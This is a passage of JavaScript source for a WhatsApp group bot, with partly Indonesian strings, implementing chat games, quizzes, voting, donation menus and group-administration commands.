            }
            break	
        case '7ttc': case '7ttt': case '7tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'You are still in the game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            reply('Partner found!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room.game.currentTurn.split('@')[0]}

Type *give up* to surrender and admit defeat`
            if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            reply('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case '7delttc': case '7delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            XeonBotInc.sendText(m.chat, `Successfully delete the TicTacToe session`, m)
            } else if (!this.game) {
            reply(`TicTacToe Session🎮 there is not any`)
            } else throw '?'
            } catch (e) {
            reply('error')
            }
            }
            break
            case '7suitpvp': case '7suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Complete your previous suit`)
	    if (m.mentionedJid[0] === m.sender) return reply(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you are challenging is playing suit with someone else :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenging @${m.mentionedJid[0].split`@`[0]} to play suit

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
            this.suit[id] = {
            chat: await XeonBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) XeonBotInc.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    
case '7donasi': case '7donate': {
	don = fs.readFileSync('./BotMedia/donasi.jpg')
let buttons = [
                    {buttonId: `${prefix}owner`, buttonText: {displayText: '👤OWNER BOT👤'}, type: 1}
                ]
                let buttonMessage = {
                    image: don,
                    caption: global.donasi,
                    footer:  `© ${global.botnma} by ${global.ownernma}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
       }
          break
case '7sewa': case '7sewabot': case '7botsewa': {
	don = fs.readFileSync('./BotMedia/sewa.jpg')
let buttons = [
                    {buttonId: `${prefix}owner`, buttonText: {displayText: '👤OWNER BOT👤'}, type: 1}
                ]
                let buttonMessage = {
                    image: don,
                    caption: global.sewabot,
                    footer:  `© ${global.botnma} by ${global.ownernma}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
       }
          break
case '7sc': case '7script': case '7scbot': case '7scriptbot': 
reply(global.script)
          break
            
            
case '7chat404': case '7cet404': {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih chat setting`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Set Chat Options",
								"rows": [
									{
										"title": "Read Chat",
										"description": `Tandai telah di baca, room chat`,
										"rowId": `${prefix}setchat read`
									},
									{
										"title": "Unread Chat",
										"description": `Tandai belum di baca, room chat`,
										"rowId": `${prefix}setchat unread`
									},
									{
										"title": "Archive Chat",
										"description": `Memindahkan room chat ke archive`,
										"rowId": `${prefix}setchat archive`
									},
									{
										"title": "Unarchive Chat",
										"description": `Memindahkan room chat dari archive ke layar utama`,
										"rowId": `${prefix}setchat unarchive`
									},
										{
											"title": "Delete",
										"description": `Menghapus obrolan chat`,
										"rowId": `${prefix}setchat delete`
										},
										{
											"title": "Mute",
										"description": `Bot tidak akan merespon di room chat ini`,
										"rowId": `${prefix}setchat mute`
										},
										{
											"title": "Unmute",
										"description": `Bot akan kembali merespon di room chat ini`,
										"rowId": `${prefix}setchat unmute`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
            case '7404setchat': {
               // if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    XeonBotInc.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    XeonBotInc.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    XeonBotInc.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    XeonBotInc.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    XeonBotInc.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    XeonBotInc.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    XeonBotInc.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
	    case '7family100hdiejebdjdijdjdjdj': { //this is in indonesian so if u want to activate u can but will be in indonesian
                if ('family100'+m.chat in _family100) {
                    reply('There are still unfinished sessions!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Answer the following questions :*\n${random.soal}\n\nThere is *${random.jawaban.length}* Answer ${random.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await XeonBotInc.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case '7halah': case '7hilih': case '7heleh': case '7huluh': case '7holoh': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
            if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
case '7todi': case '7hilihdkksls': case '7huluhkdksls': case '7helehkdkdkd': case '7holohkdkskks': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
            if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
     users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     //tod = users.replace(/[@s.whatsapp.net]/)
  teksnya = `catatan:
${tex}

@${users.split("@")[0]} 
`
XeonBotInc.sendMessage(m.chat, { text: teksnya, contextInfo: { mentionedJid: [users] }}, { quoted: m})

            break
            case '7tebak': { //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
                if (!text) {
                	let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih game tebak-tebakan`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Pilih game tebak tebakan",
								"rows": [
									{
										"title": "Tebak Lagu",
										"description": `Game tebak lagu`,
										"rowId": `${prefix}Tebak lagu`
									},
									{
										"title": "Tebak Gambar",
										"description": `Game tebak gambar`,
										"rowId": `${prefix}Tebak gambar`
									},
									{
										"title": "Tebak Kata",
										"description": `Game tebak kata`,
										"rowId": `${prefix}tebak kata`
									},
									{
										"title": "Tebak Kalimat",
										"description": `Game tebak kalimat`,
										"rowId": `${prefix}tebak kalimat`
									},
										{
											"title": "Tebak Lirik",
										"description": `Game tebak lirik`,
										"rowId": `${prefix}tebak lirik`
										},
										{
											"title": "Tebak Lontong",
										"description": `Game tebak lontong`,
										"rowId": `${prefix}tebak lontong`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
               } else if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await XeonBotInc.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    XeonBotInc.sendText(m.chat, `The song is a song from?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Time Out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,  `${global.fake}`, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    XeonBotInc.sendImage(m.chat, result.img, `Please answer the questions above\n\nDescription : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Time has run out\Answer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,  `${global.fake}`, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    XeonBotInc.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nTime : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Time has run out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,  `${global.fake}`, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    XeonBotInc.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nTime : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`,  `${global.fake}`, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    XeonBotInc.sendText(m.chat, `These are the lyrics of the song? : *${result.soal}*?\nTime : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`,  `${global.fake}`, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    XeonBotInc.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendButtonText(m.chat, [{ buttonId: '#tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`,  `${global.fake}`, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
		
                    }
                }
            }
            break
            case '7mathquiz': case '7math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                let { genMath, modes } = require('./src/math')
                if (!text) {
                let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih game mode math`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Pilih mode game math",
								"rows": [
									{
										"title": "Mode Noob",
										"description": `Untuk anak TK\n${prefix}math noob`,
										"rowId": `${prefix}math noob`
									},
									{
										"title": "Mode Easy",
										"description": `Untuk anak SD\n${prefix}math easy`,
										"rowId": `${prefix}math easy`
									},
									{
										"title": "Mode Medium",
										"description": `Untuk anak SMP\n${prefix}math medium`,
										"rowId": `${prefix}math medium`
									},
									{
										"title": "Mode Hard",
										"description": `Untuk anak SMA\n${prefix}math hard`,
										"rowId": `${prefix}math hard`
									},
										{
											"title": "Mode Extreme",
										"description": `Untuk anak Mahasiswa\n${prefix}math extreme`,
										"rowId": `${prefix}math extreme`
										},
										{
											"title": "Mode Impossible",
										"description": `Untuk anak Sarjana\n${prefix}math impossible`,
										"rowId": `${prefix}math impossible`
										},
										{
										"title": "Mode Impossible2",
										"description": `Untuk Professor\n${prefix}math impossible2`,
										"rowId": `${prefix}math impossible2`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
               } else { let result = await genMath(text.toLowerCase())
                XeonBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} seconds`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    reply("Time Out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
                }
            }
            break
            case '7mysoulmate': case '7pasanganku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Your match is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab,  `${global.fake}`, m, {mentions: ments})
            }
            break
            case '7couple': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Ciee Whats Going On💖👀`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab,  `${global.fake}`, m, {mentions: menst})
            }
            break
            case '7join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Enter the group link!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                replay(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await XeonBotInc.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
            case '7leave': case '7out': {
                if (!isCreator) throw mess.owner
                await XeonBotInc.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
	case '7kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!text && !m.quoted) throw `*Mana nomor nya?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
           //     if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
case 'adduser': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
              //  if (!isAdmins) throw mess.admin
		let users = `${text}`
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case '7promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case '7demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
        case '7block': {
		if (!isCreator) throw mess.owner
		if (!text && !m.quoted) throw `*Mana nomor yang mau di blockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		reply(mess.success)
await XeonBotInc.updateBlockStatus(users, 'block') //.then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	
}
	break
        case '7unblock': {
		if (!isCreator) throw mess.owner
		if (!text && !m.quoted) throw `*Mana nomor yang mau di Unblockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
reply(mess.success)
		await XeonBotInc.updateBlockStatus(users, 'unblock') // .then((res) => reply(mess.done)).catch((err) => reply(mess.done))
	
}
case '7unblockuser': {
		if (!isCreator) throw mess.owner
		//if (!text && !m.quoted) throw `*Mana nomor yang mau di Unblockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
//let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
reply(mess.success)
		await XeonBotInc.updateBlockStatus(`${text}`, 'unblock') // .then((res) => reply(mess.done)).catch((err) => reply(mess.done))
	XeonBotInc.sendMessage(`${text}`, { text: `Owner telah membuka blokir Anda dari BOT,gunakan bot dengan wajar dan jangan melakukan pelanggan terhadap peraturan pengguna`}, { quoted: m})
}
	break
	    case '7setname': case '7setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw '*Mana teksnya untuk judul group?*'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case '7setdesc': case '7setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw `*Mana teksnya untuk deskripsi group?*`
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case '7setppbot': case '7setbotpp': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(mess.success)
                }
                break
           case '7setppgroup': case '7setgrouppp': case '7setgcpp': case '7setppgrup': case '7setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(mess.success)
                }
                break
case '7grupinfo': case '7groupinfo':
try{
 var pic = await XeonBotInc.getProfilePicture(m.chat)
  } catch {
 var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
  }
let ingfo = `*G R O U P  I N F O*\n\n*Name :* ${groupName}\n*ID Group :* ${m.chat}\n*Made :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Group Owner:* @${groupMetadata.owner.split('@')[0]}\n*Number Of Admins :* ${groupAdmins.length}\n*Number Of Participants :* ${participants.length}\n*Desc :* \n${groupMetadata.desc}`
ds = await getBuffer(pic)
XeonBotInc.sendMessage(m.chat, { image: ds,caption: ingfo, mentions: [groupMetadata.owner] }, { quoted: m})
break
            case '7tagall': case '7tag': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case '7hidetag': {
            if (!m.isGroup) throw mess.group
            
            XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
            }
            break

	    case '7style': case '7styletext': {
	      //  if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // response when limit runs out
		//db.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw `*Masukan teks !*\n_Contoh:_ ${prefix + command} it's me ${global.pengguna}`
                let anu = await styletext(text)
                let teks = `Entered Text:  ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
               case '7voting': case '7vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Vote masih berlangsung di group ini !_\n\n*${prefix}deletevote* - untuk menghapus vote`
            if (!text) throw `*Apa yang mau di vote?*\n_Contoh:_ ${prefix + command} ${global.pengguna} maju jadi presiden Indonesia`
            reply(`Voting starts!\n\n*${prefix}upvote* - untuk setuju\n*${prefix}devote* - untuk tidak setuju\n*${prefix}cekvote* - untuk cek hasil vote\n*${prefix}deletevote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}

 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}

 
└────

*${prefix}hapusvote* - untuk menghapus votes`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '👍🏻Up-Vote👍🏻'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '👎🏻De-Vote👎🏻'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer:  `${global.fake}`,
                buttons: buttonsVote,
                headerType: 1
            }
            XeonBotInc.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case '7upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*Type ${prefix}vote* - untuk memulai voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus votes`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '👍🏻Up-Vote👍🏻'}, type: 1},
